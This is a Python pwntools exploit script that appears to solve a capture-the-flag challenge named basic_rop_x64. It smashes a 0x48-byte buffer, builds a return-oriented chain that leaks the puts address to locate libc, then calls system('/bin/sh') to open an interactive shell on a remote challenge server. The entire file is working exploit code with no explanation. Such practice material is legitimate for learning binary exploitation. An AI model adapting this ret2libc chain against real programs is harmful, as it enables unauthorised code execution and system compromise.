#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./basic_rop_x64_patched', checksec=False)

libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)

gs = """
b *main
b *main+62
b *main+94
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 9965)
    else:
        return process(elf.path)


poprdi_ret = pack(0x0000000000400883)
ret = pack(0x0000000000400883 + 1)
puts_got = pack(elf.got['puts'])
puts_plt = pack(elf.plt['puts'])
main = pack(elf.sym['main'])

leak = b'a' * 0x48 + ret + poprdi_ret + puts_got + puts_plt + main

io = start()
sl(leak)
io.recvuntil(b'a' * 0x40)
puts = unpack(io.recvn(6) + b'\x00' * 2)
libc.address = puts - libc.sym['puts']
success(f"puts @ {hex(puts)}")
success(f"libc @ {hex(libc.address)}")

system = pack(libc.symbols['system'])
binsh = pack(next(libc.search(b'/bin/sh\x00')))
payload  = b'a' * 0x48 + poprdi_ret + binsh + system

sl(payload)
io.interactive()